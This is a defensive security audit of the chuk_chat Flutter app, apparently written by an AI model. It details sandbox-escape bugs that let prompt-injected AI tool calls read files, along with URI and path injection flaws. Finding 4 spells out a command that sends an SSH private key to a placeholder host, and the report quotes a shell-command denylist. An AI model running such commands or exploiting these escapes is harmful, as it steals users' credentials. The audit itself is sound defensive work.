# Security Audit Report — chuk_chat

**Date:** 2026-04-11
**Auditor:** Claude (authorized codebase audit)
**Scope:** Full repository (client Flutter app, SQL migrations, Docker/nginx, Android manifest)

## Executive Summary

The core cryptography (AES-256-GCM via the `cryptography` package, PBKDF2-HMAC-SHA-256 with 600k iterations, per-user random 16-byte salt, secure random 12-byte nonces) and Supabase RLS coverage are, on the whole, well implemented. However, the `BashSandbox` service — which executes AI-controlled shell commands on the desktop — contains multiple high-severity escape/traversal bugs that add up to arbitrary file read and likely arbitrary code execution with the user's own privileges. The sandbox boundary check is a textbook `startsWith` prefix-confusion flaw, the allowlist is defeated by shell features (tilde expansion, newlines, brace expansion) that are not in the denylist, and arguments that don't look like paths are entirely skipped from validation before being handed to `sh -c`. Secondary issues include AI-controlled `mailto:`/`tel:`/`sms:` URI construction with unescaped user data, a markdown link launcher that opens any scheme the user confirms (including `file:`, `javascript:`, `intent:`), and several `debugPrint` calls that would log raw WebSocket payloads (chat content) in debug builds, contradicting the repo's own privacy-logging rules. These are all fixable with small, localized changes — the architecture is sound; the surface-level plumbing needs tightening.

---

## Finding 1: Prefix-based path traversal in BashSandbox.isWithinSandbox

**Severity:** Critical
**Category:** Path traversal / sandbox escape
**Location:** `lib/services/bash_sandbox.dart:161-190` (specifically line 181)

**Description:** `isWithinSandbox` validates that each argument's resolved path is within the configured sandbox folder by calling `String.startsWith(normalizedSandbox)`. Because it is a string-prefix compare, any sibling directory whose name begins with the sandbox directory name passes validation. If the sandbox is `/home/user/safe`, then `/home/user/safe_secrets/creds.txt`, `/home/user/safe.bak/...`, and `/home/user/safe-old/...` all "start with" the sandbox path and pass the check. The command is then handed to `sh -c` (line 256-263) and reads files outside the intended directory.

**Evidence:**
```dart
resolvedPath = _normalizePath(resolvedPath);
final normalizedSandbox = _normalizePath(_sandboxFolder!);

if (!resolvedPath.startsWith(normalizedSandbox)) {
  return false;
}
```

**Impact:** AI-issued tool calls (the `platform_tools_native` path) can read any file under any sibling directory whose name begins with the sandbox name. On machines where users commonly name folders `proj`, `work`, or `src`, a malicious prompt-injected AI response can escape trivially.

**Recommendation:** Require an exact match or a trailing-separator prefix check:
```dart
if (resolvedPath != normalizedSandbox &&
    !resolvedPath.startsWith('$normalizedSandbox/')) {
  return false;
}
```

---

## Finding 2: BashSandbox executes shell metacharacters via `sh -c`, allowing arbitrary file read through tilde expansion

**Severity:** Critical
**Category:** Sandbox escape / arbitrary file read
**Location:** `lib/services/bash_sandbox.dart:168` and `lib/services/bash_sandbox.dart:254-263`

**Description:** The sandbox invokes `io.Process.run('sh', ['-c', command], ...)`. Dart's `File('$sandbox/~/.bashrc').absolute.path` does NOT expand `~`, so the resolved path is `/sandbox/~/.bashrc`, which passes the `startsWith` check. But when `sh -c 'cat ~/.bashrc'` runs, the shell DOES expand `~` to the real home directory, reading an arbitrary file outside the sandbox. The same issue applies to `$HOME`, `$XDG_*`, and glob-prefixed paths — the pattern denylist catches `$` but not `~`, not braces (`{a,b}`), not globs such as `*`, and not newlines (the `split(RegExp(r'\s+'))` collapses them, but `sh -c` still interprets them as statement separators).

**Evidence:**
```dart
// Validation:
if (!arg.contains('/') && !arg.startsWith('.')) continue;
...
resolvedPath = io.File('$_sandboxFolder/$arg').absolute.path; // Dart does NOT expand ~
...
// Execution:
final result = await io.Process.run(
  'sh', ['-c', command], workingDirectory: _sandboxFolder, ...
); // sh DOES expand ~
```

**Impact:** Any approved command can exfiltrate `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.bashrc`, `~/.gnupg/*`, etc. For example, `cat ~/.ssh/id_rsa` passes every check — `cat` is in `safeCommands`, `~/.ssh/id_rsa` contains `/` and resolves inside the sandbox prefix — and reads the private key.

**Recommendation:** (a) Do not use `sh -c`. Pass argv directly: `Process.run(parts[0], parts.sublist(1), ...)`. (b) Reject any argument containing `~`, `$`, globs (`*`, `?`, `[`), braces (`{`, `}`), or backticks. (c) Resolve paths with `path.canonicalize` then verify containment by splitting into path segments rather than string-prefix.

---

## Finding 3: BashSandbox skips validation for arguments that look like "options" or "plain tokens"

**Severity:** High
**Category:** Sandbox escape
**Location:** `lib/services/bash_sandbox.dart:166-168`

**Description:** The argument loop skips any arg that (a) starts with `-` or (b) doesn't contain `/` and doesn't start with `.`. This means flags like `--output=/etc/passwd` and any "file-ish" name without a slash are never checked against the sandbox. `ffmpeg` and `find` are in the safe-command list; both accept options that take file paths as attached values (e.g., `ffmpeg -i=/etc/hosts` in some builds, or `find -path /etc/passwd`). Even for simple commands, `cat filename` where `filename` is a symlink left inside the sandbox that points out of the sandbox bypasses the check entirely because the resolved path is the symlink's own path, not its target.

**Evidence:**
```dart
for (final arg in parts.skip(1)) {
  if (arg.startsWith('-') ) continue;                // flags never checked
  if (!arg.contains('/') && !arg.startsWith('.')) continue; // plain names never checked
  ...
}
```

**Impact:** Combined with the symlink gap, any file readable by the user is reachable. An attacker-controlled directory inside the sandbox (or a pre-existing symlink the user forgot about) yields a read primitive.

**Recommendation:** Resolve all paths with `File.resolveSymbolicLinks()` / `Link.target`, not `absolute.path`. Validate ALL arguments that could be file paths (including `-o=`, `--file=`, etc.), or better: ban symlinks inside the sandbox entirely.

---

## Finding 4: BashSandbox denylist does not cover newlines, so multiple commands can be chained

**Severity:** High
**Category:** Sandbox escape / command injection
**Location:** `lib/services/bash_sandbox.dart:44-69`, `lib/services/bash_sandbox.dart:114-127`

**Description:** `isSafeCommand` checks the trimmed command against a denylist of patterns: `;`, `&&`, `||`, `|`, `>`, `>>`, `$`, backticks. It does NOT check for newline (`\n`) or carriage return, which `sh -c` also treats as a statement separator. A command like `"ls\ncurl https://evil.example/$(cat ~/.ssh/id_rsa|base64)"` — constructed by the AI as a single tool-call argument string — is split on whitespace by the validator (the newline is whitespace), the first token `ls` is in the safe list, no dangerous pattern matches, and then `sh -c` runs both statements.

**Evidence:**
```dart
static const List<String> dangerousPatterns = [
  'sudo', 'su ', ..., '>', '>>', '|', ';', '&&', '||', r'$', '`',
  'curl', 'wget', ...
]; // no '\n', no '\r', no '{', no '}', no '*', no '~'
```

**Impact:** The approval dialog shows only the first line of the command to the user ("ls"), making social-engineering into approving destructive operations trivial.

**Recommendation:** Reject any command containing `\n`, `\r`, `\t` (tab), `{`, `}`, `*`, `?`, `~`, `[`, `]`. Better: split the string into argv yourself and run with `runInShell: false` and no shell at all.

---

## Finding 5: Markdown link launcher opens any URI scheme once user taps "Open"

**Severity:** Medium
**Category:** URL scheme injection / phishing
**Location:** `lib/widgets/markdown_message.dart:64-89`

**Description:** `_onTapLink` takes an href from AI-rendered markdown, shows a "Do you really want to open $href" dialog, and on confirm calls `launchUrl(Uri.parse(href))` with no scheme allow-list. A prompt-injected AI can emit `[click me](file:///home/user/.bash_history)`, `[click me](intent://...)` on Android, or `[click me](javascript:...)` in the web build. The dialog shows the full href, but users habitually click through dialogs, and the href can be visually truncated / Unicode-spoofed.

**Evidence:**
```dart
if (shouldOpen == true) {
  final Uri uri = Uri.parse(href);
  if (await canLaunchUrl(uri)) {
    await launchUrl(uri);
  }
}
```

**Impact:** On desktop builds, `file:` URIs open the user's file manager at arbitrary locations (low severity). On Android, `intent://` URIs can cross-launch apps with attacker-controlled extras. In the web build, `javascript:` schemes are blocked by the browser, but `data:text/html,...` may not be.

**Recommendation:** Whitelist `http`, `https`, `mailto`, `tel`, `sms`:
```dart
const allowed = {'http', 'https', 'mailto', 'tel', 'sms'};
if (!allowed.contains(uri.scheme.toLowerCase())) return;
```

---

## Finding 6: Debug-mode WebSocket error handler logs full raw message (chat content)

**Severity:** Medium
**Category:** Privacy / logging
**Location:** `lib/services/websocket_chat_service.dart:222-228`

**Description:** On a JSON parse failure the handler calls `debugPrint('Failed to parse WebSocket message: $message')`, where `$message` is the raw WebSocket frame — which for this app routinely contains the model's streaming text output (chat content). The project's own `CLAUDE.md` ("Privacy: Logging") explicitly states: "NEVER log message content, tokens, passwords, emails". It is gated on `kDebugMode`, so release builds are unaffected, but developer-facing logs (attached to bug reports) and emulator captures will include chat content.

**Evidence:**
```dart
} on FormatException catch (e) {
  if (kDebugMode) {
    debugPrint('Failed to parse WebSocket message: $message');
    debugPrint('Error: $e');
  }
```

**Impact:** Developer logs, screen shares, and CI captures may include sensitive user messages. Also a compliance concern for anyone using chuk_chat under GDPR.

**Recommendation:** Log only the message length / first few safe bytes and the error class:
```dart
debugPrint('Failed to parse WebSocket message: len=${message.length} err=${e.message}');
```
or truncate/redact via `pLog` from `lib/utils/privacy_logger.dart`.

---

## Finding 7: `sms:` URI built by string concatenation without encoding the phone number

**Severity:** Low
**Category:** URI injection
**Location:** `lib/services/device_services.dart:599-603`

**Description:** `createSmsDraft` encodes the body with `Uri.encodeComponent` but concatenates the phone number into the URI as-is: `'sms:$phoneNumber?body=...'`. An AI-controlled `phoneNumber` containing `?body=malicious` can inject its own `body` parameter that wins over the legitimate one (query-string parameter precedence varies by target app), and a `#` can split off the query entirely. Since `phoneNumber` comes from tool arguments decoded from AI output, a prompt-injected AI can change the message the user thinks they're sending.

**Evidence:**
```dart
final encodedBody = body != null ? Uri.encodeComponent(body) : '';
final uri = Uri.parse(
  'sms:$phoneNumber${body != null ? '?body=$encodedBody' : ''}',
);
```

**Impact:** Social engineering vector — the AI can craft an SMS draft whose displayed recipient/body disagrees with the tool-call JSON the user was shown.

**Recommendation:** Use `Uri(scheme: 'sms', path: phoneNumber, queryParameters: body != null ? {'body': body} : null)` — same pattern used for `mailto` elsewhere in the file.

---

## Finding 8: Nextcloud client concatenates AI-controlled `remotePath` into the URL without sanitization

**Severity:** Medium (Suspected — depends on Nextcloud server hardening)
**Category:** Path traversal / URL injection
**Location:** `lib/services/nextcloud_service.dart:209-238`, `lib/services/nextcloud_service.dart:241-273`, `lib/services/nextcloud_service.dart:275-296`

**Description:** `downloadFile`, `uploadFile`, and `deleteFile` take a `remotePath` (from AI tool arguments), prepend `/` if missing, and concatenate it into the WebDAV URL: `'$_serverUrl/remote.php/dav/files/$_username$remotePath'`. There is no encoding (so `#`, `?`, `%` misbehave), no `..` stripping (so `../admin/secrets` reaches `/remote.php/dav/files/admin/secrets`), and no enforcement that the final resolved URL stays under `/remote.php/dav/files/$_username/`. Nextcloud's own server normalizes `..` in paths and rejects out-of-user access, so this is defense-in-depth rather than an immediate break — but every other Nextcloud client I've seen does sanitize, and the AI-controlled input path makes exploitation one step away from server misconfiguration.

**Evidence:**
```dart
if (!remotePath.startsWith('/')) remotePath = '/$remotePath';
final response = await http.get(
  Uri.parse('$_serverUrl/remote.php/dav/files/$_username$remotePath'),
  headers: _authHeaders,
);
```

**Impact:** If the user's Nextcloud instance, or a reverse proxy in front of it, mis-normalizes `..` segments, an AI tool call could read or overwrite another user's files. Also affected: any NC app that exposes a path outside `/files/` but same prefix (e.g., `/remote.php/dav/files/bob/../../admin-only-endpoint`).

**Recommendation:** Normalize with `path.normalize`, reject any `..` segment after normalization, and percent-encode each path segment with `Uri.encodeComponent` joined by `/`.

**How to confirm:** Attempt `downloadFile('../admin/file')` against a local Nextcloud and check the server logs. I did not run this.

---

## Finding 9: `<email>` and `<map>` blocks pass AI-controlled data into `mailto:`/`tel:` URIs with no scheme/content validation

**Severity:** Low
**Category:** URI injection
**Location:** `lib/widgets/message_bubble.dart:1212-1234` (mailto), `lib/widgets/map_block_renderer.dart:798` (tel), `lib/pages/fullscreen_map_page.dart:1238-1262` (tel + website)

**Description:** AI-generated `<map>` blocks emit a `website` field that is launched after only a `startsWith('http')` check, which passes values like `http:malicious` or `httpX://…`. The `phone` field is concatenated into `'tel:$phone'` with no validation. `<email>` block data flows into `Uri(scheme: 'mailto', path: to, ...)` and is then launched unconditionally. A malicious `website` of `javascript:foo` would be rewritten to `https://javascript:foo`, which `Uri.parse` accepts, and `launchUrl` may accept on some platforms.

**Evidence:**
```dart
onTap: () => launchUrl(
  Uri.parse(
    website.startsWith('http') ? website : 'https://$website',
  ),
),
```

**Impact:** AI-crafted place cards can drive the user into phishing sites or odd intents. Low severity because all three require user tap and the content is always attributable to the model the user is talking to.

**Recommendation:** Require `startsWith('http://')` or `startsWith('https://')` (not `'http'`), strip whitespace, and reject any phone that contains characters outside `+0-9 ()-`.

---

## Finding 10: `.env` is not in `.gitignore` (or visibly tracked) — verify manually

**Severity:** Info
**Category:** Secret exposure
**Location:** repo root `.env`, `.gitignore`

**Description:** `.env` exists on disk (`ls /home/user/git/chuk_chat/.env` succeeds) and `git ls-files | grep .env` returns only the `.example` files, so `.env` itself is not currently tracked. This is correct. No finding — included as confirmation that the secret file has not been committed. The Dockerfile.web pattern of writing `lib/web_env.dart` with build-time Supabase URL/anon key is also correct: anon keys are designed to be shipped with web builds and RLS is what protects data.

**Evidence:**
```
$ git ls-files | grep -E "(key\.properties|\.env|local\.properties)"
.env.example
.env.maestro.example
android/key.properties.example
```

**Recommendation:** Keep `.env`, `android/key.properties`, and `android/local.properties` in `.gitignore` and never check them in. (Verified they are not in the index.)

---

## Categories Reviewed — No Findings

- **Crypto primitives** (`lib/services/encryption_service.dart`): AES-256-GCM, PBKDF2-HMAC-SHA-256 with 600k iterations, 16-byte random salt per user, 12-byte nonces from `Random.secure()`, constant-time key comparison, versioned payload format. Implementation is correct and uses the `cryptography` package rather than rolling its own. No IV reuse (fresh nonce every encrypt call). No ECB, no MD5/SHA-1.
- **SQLite injection** (`lib/services/local_chat_cache_native.dart`): Every query uses parameter binding. The `search()` function properly escapes LIKE wildcards (`_escapeLikePattern`) and uses `ESCAPE '\\'`. No string-built SQL.
- **Supabase RLS** (`migrations/*.sql`): All user-facing tables have `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` and per-operation policies scoped by `auth.uid() = user_id` or nested ownership checks. `webhook_events` is RLS-enabled with no policies (service-role only). SECURITY DEFINER RPCs have an explicit `if (p_user_id != auth.uid()) return 0;` guard and `search_path = ''`. Storage bucket policies enforce `auth.uid()::text = (storage.foldername(name))[1]`.
- **Android manifest** (`android/app/src/main/AndroidManifest.xml`): `cleartextTrafficPermitted="false"`, `networkSecurityConfig` set, `allowBackup="false"`, foreground service not exported, MainActivity correctly exported only for LAUNCHER, no extra intent filters.
- **Hardcoded secrets in Dart source** (`lib/**/*.dart`): Searched for typical patterns (`eyJ...`, `sk-...`, `AKIA...`, `api_key = "long-string"`). No matches. Supabase URL/anon-key come from `--dart-define` / `.env` / build-generated `web_env.dart`.
- **Web build credentials**: The Dockerfile.web approach of baking anon keys into `web_env.dart` is correct. Supabase anon keys are public by design and rely on RLS.
- **Artifact storage** (`lib/services/artifact_storage_service.dart`): I initially flagged this as plaintext-in-DB, but confirmed all writes go through `_encryptOrThrow` (`EncryptionService.encrypt`) before hitting the `content` column. False alarm.
- **Markdown XSS**: No `WebView` is used anywhere in the app. Visual `<chart>`/`<map>`/`<email>` tags are parsed as JSON and rendered as Flutter widgets, not HTML. `markdown_widget` renders to Flutter widgets; no `dart:html` sink found.
- **JWT handling**: Delegated entirely to `supabase_flutter`. No custom parse/verify.
